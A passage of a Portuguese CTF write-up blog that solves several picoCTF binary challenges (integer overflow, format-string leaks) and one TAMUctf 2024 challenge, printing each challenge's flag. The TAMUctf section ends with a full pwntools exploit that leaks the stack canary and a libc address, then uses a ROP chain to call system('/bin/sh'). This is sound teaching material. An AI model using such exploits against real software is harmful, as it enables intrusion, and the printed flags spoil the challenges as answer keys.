  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
```

Não recebemos nenhum binário compilado aqui. Podemos, entretanto, compilar nós mesmos para testar as coisas.

Olhando o source code, precisamos dar trigger nessa condicional:

```c
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

Para entrar na condicional, é necessário garantir que a conversão da string `entry` para long integer usando a `strtol` resulte em `0`. Dá para conseguir isso fornecendo um input como `0` ou alguma coisa inválida tipo `abc`.

Aqui o meu solve:

```
nc saturn.picoctf.net 56510
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
nvsuinvfuisj
Please enter the length of your data:
10
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
```

flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}`

## two sum

Source code:

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);

    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}
```

Não recebemos nenhum binário compilado.

Para resolver o problema, precisamos acionar o seguinte código: \
`else if (addIntOvf(sum, num1, num2) == -1)` \
e esse: \
`if (num1 > 0 || num2 > 0)` \
Para que a função `addIntOvf` retorne `-1`, precisamos fornecer dois inteiros positivos que resultem em um inteiro negativo (o que indica um overflow). Precisamos escolher dois inteiros positivos devido à segunda condição mencionada.

`int` é uma variável de 4 bytes. O tamanho máximo dela é `2147483647` (2^31 - 1). Então se tivermos `num1` como `2147483647` e `num2` como `1`, teremos um integer overflow. Vamos tentar isso:

```
nc saturn.picoctf.net 62116
n1 > n1 + n2 OR n2 > n1 + n2
What two positive numbers can make this possible:
2147483647
1
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}
```

flag: `picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}`

## format string 0

Aqui o source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

Checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Para acionar a impressão da flag, você precisa explorar uma vulnerabilidade de format string. Aqui está o processo:

Ao iniciar o programa, você entra na função `serve_patrick()`. Para continuar para a função `serve_bob()`, a opção disponível é `Gr%114d_Cheese`.

Quando você chega em `serve_bob()`, há um menu semelhante, e qualquer seleção será impressa usando `printf`. Isso cria uma vulnerabilidade de **format string**. Escolher a opção `Pe%to_Portobello` resulta em:

```
Enter your recommendation: Pe%to_Portobello
Pe20021560_Portobello
```

Isso indica que a entrada está sendo usada como formato pelo printf, e números são lidos da memória.

E se escolhermos a opção `Cla%sic_Che%s%steak`?

```
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

O que aconteceu foi que o `%s` na entrada tenta imprimir strings armazenadas em endereços de memória. Como `printf` não tem argumentos para `%s`, ele usa argumentos da memória, levando a um erro de segmentação (segfault) e revelando a flag.

flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}`

## format string 1

Source code:

```c
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

Checksec:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Temos uma vulnerabilidade de format string aqui:

```c
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
```

Controlamos o que é fornecido para a função `printf`. Como não sabemos o tamanho de `secret-menu-item-1.txt` ou `secret-menu-item-2.txt`, pode ficar meio difícil saber em qual lugar da memória a string em `flag.txt`está. Então eu decidi simplesmente colocar um monte de `%p`e ver o que eu consigo:

```
Give me your order and I'll read it back to you:
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
Here's your order: 0x402118,(nil),0x760c1fa2da00,(nil),0x11a1880,0xa347834,0x7ffcaa973f50,0x760c1f81ee60,0x760c1fa434d0,0x1,0x7ffcaa974020,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x760c1fa458d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x760c1fa56de9,0x760c1f827098,0x760c1fa434d0,(nil),0x7ffcaa974030,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,
```

A partir do pointer 14, temos uma string. Podemos ver o que ela é fazendo:

```python
>>> int.to_bytes(0x7b4654436f636970, 8, 'little')
b'picoCTF{'
```

Se fizermos o mesmo com os próximos valores, conseguimos a flag.

flag: `picoCTF{4n1m41_57y13_4x4_f14g_50396c64}`

## Stonks

Source code:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
```

Não recebemos nenhum arquivo binário compilado no chall.

Nesse chall, temos outra vulnerabilidade de format string. Dê uma olhada nessas linhas da função `buy_stonks`:

```c
        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);
```

Precisamos saber onde o conteúdo de `api` está. Eu coloquei um monte de `%p` novamente porque parecia ser a forma mais simples de resolver:

```
nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
Buying stonks with token:
0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9,
Portfolio as of Fri Aug  2 05:05:33 UTC 2024


1 shares of SXD
1 shares of NJF
1 shares of CN
4 shares of HXQ
3 shares of UR
81 shares of ONKL
188 shares of F
451 shares of G
327 shares of ANLB
175 shares of U
189 shares of K
Goodbye!
```

Criei um script em python para olhar para o output e gerar uma solução:

```python
output = '0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9'
output = output.split(',')
decoded = ''
for _ in range(len(output)):
        output[_] = output[_].encode()
        try:
                decoded += int.to_bytes(int(output[_], 16), 8, 'big').decode()[::-1]
        except (UnicodeDecodeError, ValueError):
                continue

print(decoded)
```

flag: `picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}`

# Challenge extra ^^
## TAMUctf 2024 - admin panel

DISCLAIMER: Eu não resolvi esse challenge durante o CTF.

Vamos começar :)

O desafio nos fornece um arquivo zip. Ao descompactá-lo, obtemos uma libc, um arquivo ld, um arquivo executável e um arquivo de código fonte. Vamos dar uma olhada no código fonte:

```c
#include <stdio.h>
#include <string.h>

int upkeep() {
        // IGNORE THIS
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

int admin() {
        int choice = 0;
        char report[64];

        puts("\nWelcome to the administrator panel!\n");
        puts("Here are your options:");
        puts("1. Display current status report");
        puts("2. Submit error report");
        puts("3: Perform cloning (currently disabled)\n");

        puts("Enter either 1, 2 or 3: ");
        scanf("%d", &choice);

        printf("You picked: %d\n\n", choice);

        if (choice==1) {
                puts("Status report: \n");

                puts("\tAdministrator panel functioning as expected.");
                puts("\tSome people have told me that my code is insecure, but");
                puts("\tfortunately, the panel has many standard security measures implemented");
                puts("\tto make up for that fact.\n");

                puts("\tCurrently working on implementing cloning functionality,");
                puts("\tthough it may be somewhat difficult (I am not a competent programmer).");
        }
        else if (choice==2) {
                puts("Enter information on what went wrong:");
                scanf("%128s", report);
                puts("Report submitted!");
        }
        else if (choice==3) {
                // NOTE: Too dangerous in the wrong hands, very spooky indeed
                puts("Sorry, this functionality has not been thoroughly tested yet! Try again later.");
                return 0;

                clone();
        }
        else {
                puts("Invalid option!");
        }
}

int main() {
        upkeep();

        char username[16];
        char password[24];
        char status[24] = "Login Successful!\n";

        puts("Secure Login:");
        puts("Enter username of length 16:");
        scanf("%16s", username);
        puts("Enter password of length 24:");
        scanf("%44s", password);
        printf("Username entered: %s\n", username);
        if (strncmp(username, "admin", 5) != 0 || strncmp(password, "secretpass123", 13) != 0) {
                strcpy(status, "Login failed!\n");
                printf(status);
                printf("\nAccess denied to admin panel.\n");
                printf("Exiting...\n");
                return 0;
        }

        printf(status);
        admin();

        printf("\nExiting...\n");
}
```

Checksec do binário fornecido:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Tudo está habilitado !

Eu usei o _pwninit_ para gerar um arquivo patcheado que usa a `libc` e o `ld` fornecidos. Você pode conferi-lo aqui: [pwninit](https://github.com/io12/pwninit)

Ao olhar o código-fonte, há algumas coisas suspeitas...

1. `password` é um buffer de tamanho 24, mas estamos escrevendo 45 bytes nele (`scanf("%44s", password);`).
2. Existem dois `printf(status);`, o que pode se tornar uma vulnerabilidade de format string.
3. `report` é um buffer de tamanho 64, mas estamos escrevendo 129 bytes nele (`scanf("%128s", report);`).

Para executar a função `admin`, precisamos de um `username` com `admin` e uma `password` com `secretpass123`. Então, para o `username`, eu forneci a entrada `admin`. Mas o `password` é um buffer de tamanho 24 e podemos escrever mais coisas nele. Na verdade, podemos sobrescrever o conteúdo de `status`, que é declarado imediatamente após `password`!

Como `status` é usado dentro do `printf`, na verdade temos uma vulnerabilidade de format string. Precisamos preencher o buffer `password` + o espaço entre `password` e `status` e então começar a escrever em `status`.

Para calcular o índice passado na format string, podemos usar o gdb. Vamos inserir um ponto de interrupção logo antes do `printf` vulnerável e examinar a pilha:

![admin-panel1](/images/davi-post-pwn/admin-panel/admin-panel1.png)

O stack cookie (logo antes do `rbp`) está na posição 10 se começarmos a contar do topo da pilha. O `printf` começará imprimindo os registradores e depois imprimirá a pilha. Isso significa que precisamos adicionar 5 a essa contagem (resultando em 15). É importante saber o stack cookie, pois temos um buffer overflow dentro da função `admin`.

É importante notar também que temos ASLR e PIE ativados, então seria bom ter um vazamento de endereço. Felizmente, ainda podemos escrever mais coisas na entrada do password. Vamos olhar novamente a pilha e ver se conseguimos vazar algo:

![admin-panel2](/images/davi-post-pwn/admin-panel/admin-panel2.png)

Há um endereço logo após o `rbp`. É um endereço de retorno para _algum lugar_. Vamos descobrir para onde isso nos leva executando o comando `vmmap`.

![vmmap](/images/davi-post-pwn/admin-panel/admin-panel3.png)

Nosso endereço é `0x00007ffff7e3109b`, e como podemos ver, isso está dentro da `libc`. Então, podemos vazar um endereço da libc. Como a posição do stack cookie é 15 e está 2 posições antes do endereço de retorno, a posição do endereço da libc será 17 quando explorarmos a vulnerabilidade da format string.

Até agora temos:

```python
p = process("./admin-panel_patched")
p.recvline()
p.recvline()
p.sendline(b"admin")
p.recvline()
p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p')
p.recvline()
```

Isso deve imprimir o stack cookie e o endereço da libc. Vamos pegar esses valores e imprimi-los na solução:

```python
leak_addr = p.recvline().decode()[:-1].split(',')
stack_cookie = int(leak_addr[0], 16)
libc_leak = int(leak_addr[1], 16)
print(f"stack cookie is: {hex(stack_cookie)}")
print(f"leaked address is: {hex(libc_leak)}")
```

Ótimo! O stack cookie e o endereço vazado estão salvos. O programa está agora dentro da função `admin()`. Vamos tentar explorar o estouro de buffer escolhendo a opção 2. Há uma escrita de 129 bytes no buffer de 64 bytes `report`. Se fizermos um teste, podemos verificar que realmente podemos sobrescrever o endereço de retorno (e, consequentemente, o stack cookie ;;)

![stack_smashing](/images/davi-post-pwn/admin-panel/admin-panel4.png)

Vamos abri-lo no gdb e inserir um ponto de interrupção antes da verificação do stack cookie (`__stack_chk_fail@plt`). Estou colocando o ponto de interrupção na instrução `mov rdx, QWORD PTR [rbp-0x8]`. Vamos também usar o comando `pattern create` para gerar um padrão para nossa entrada e ver onde as coisas estão dando errado.

Isso é o que eu vejo dentro do registrador `rdx`: \
`$rdx : 0x616161616161616a ("jaaaaaaa"?)` \
(poderíamos também verificar o valor de `rbp-0x8` usando o comando `x/gx $rbp-0x8`) \
Verificando a posição do offset:
```
gef➤  pattern offset 0x616161616161616a
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

Isso significa que precisamos usar a parte do padrão `'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'` para alcançar o stack cookie. Depois disso, escrevemos o stack cookie que foi recuperado usando a vulnerabilidade de format string e escrevemos qualquer coisa no `rbp`, não importa. Depois de tudo isso, finalmente podemos escrever no endereço de retorno sem problemas.

Mas para onde retornamos?

Não temos nenhuma função interessante em nosso programa que poderia executar algo para nós. O que temos, no entanto, é um endereço da libc no endereço de retorno. Como temos PIE e ASLR ativados, esse endereço será randomizado toda vez, mas sempre será a mesma instrução. Nesse caso, precisamos apenas calcular o offset da instrução sendo executada considerando o ponto de entrada como referência. Vamos usar o gdb para alcançar isso

![admin-panel5](/images/davi-post-pwn/admin-panel/admin-panel5.png)

O endereço destacado é o endereço de retorno. Vamos ver para onde isso nos leva

![admin-panel6](/images/davi-post-pwn/admin-panel/admin-panel6.png)

Isso nos leva para `__libc_start_main+235`. Agora precisamos verificar qual é o offset dessa instrução quando o programa não está em execução. Então você pode abrir o arquivo libc dentro do gdb. Eu o abri, disassemblei a `__libc_start_main` e comecei a procurar pela instrução específica `__libc_start_main+235`.

![admin-panel7](/images/davi-post-pwn/admin-panel/admin-panel7.png)

Lá está :) Está no endereço `0x000000000002409b`, então está no offset `0x2409b` após o entrypoint da libc. Agora podemos usar o endereço da libc que vazamos anteriormente e subtrair `0x2409b` dele para encontrar o endereço do entrypoint da libc mesmo quando o programa está em execução!

Aqui está o cálculo:

```python
libc_start_main_offset = 0x000000000002409b
libc_entrypoint = libc_leak - libc_start_main_offset
```

Agora podemos escolher qualquer endereço da libc para pular. Vamos ver se conseguimos executar a função system e passar o argumento `/bin/sh` para obter uma shell.

Procurando o offset de `system` dentro da libc:

![admin-panel8](/images/davi-post-pwn/admin-panel/admin-panel8.png)

`system` está no offset `0x44af0`. Vamos salvar isso:
```python
system_offset = 0x44af0
```

`"/bin/sh"` está no offset `18052c`:

![admin-panel9](/images/davi-post-pwn/admin-panel/admin-panel9.png)

```python
bin_sh_offset = 0x18052c
```

Então sabemos o endereço de `system` e o endereço da string `"/bin/sh"`. No entanto, precisamos colocar a string `"/bin/sh"` no registrador `rdi` ao chamar a função `system`. Podemos conseguir isso usando ROP. Vamos procurar alguns gadgets usando `ROPgadget`

O comando é: `ROPgadget --binary libc.so.6 --ropchain | grep "pop rdi"` \
`[+] Gadget found: 0x23a5f pop rdi ; ret` \
Vamos também salvá-lo:
```python
pop_rdi_ret_offset = 0x23a5f
```

Ótimo! Isso é tudo o que precisamos :)

Em conclusão, estamos preenchendo todo o buffer `report`, sobrescrevendo o stack cookie, colocando qualquer coisa no registrador `rbp`, sobrescrevendo o endereço de retorno com a instrução `pop rdi ; ret` para colocar a string `"/bin/sh"` no registrador `rdi`, colocando o endereço da string `"/bin/sh"` (o entrypoint da libc + o offset que encontramos) logo depois para que `pop rdi` funcione corretamente, e então colocando o endereço de `system` (o entrypoint da libc + o endereço que encontramos) depois para que `ret` retorne para ele :)

Esta é a minha solução para este desafio:

```python
from pwn import *

libc_start_main_offset = 0x000000000002409b
pop_rdi_ret_offset = 0x23a5f
system_offset = 0x44af0
bin_sh_offset = 0x18052c

p = process("./admin-panel_patched")
p.recvline()
p.recvline()
p.sendline(b"admin")
p.recvline()
p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p')
p.recvline()

leak_addr = p.recvline().decode()[:-1].split(',')
stack_cookie = int(leak_addr[0], 16)
libc_leak = int(leak_addr[1], 16)
print(f"stack cookie is: {hex(stack_cookie)}")
print(f"leaked address is: {hex(libc_leak)}")

libc_entrypoint = libc_leak - libc_start_main_offset
pop_rdi_ret = libc_entrypoint + pop_rdi_ret_offset

payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'
payload += p64(stack_cookie)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_offset + libc_entrypoint)
payload += p64(system_offset + libc_entrypoint)

p.recvuntil(b'2 or 3:')
p.sendline(b'2')
p.recvuntil(b'wrong:')
p.sendline(payload)

p.interactive()
```

![admin-panel10](/images/davi-post-pwn/admin-panel/admin-panel10.png)

É isso. Espero que tenham gostado :)
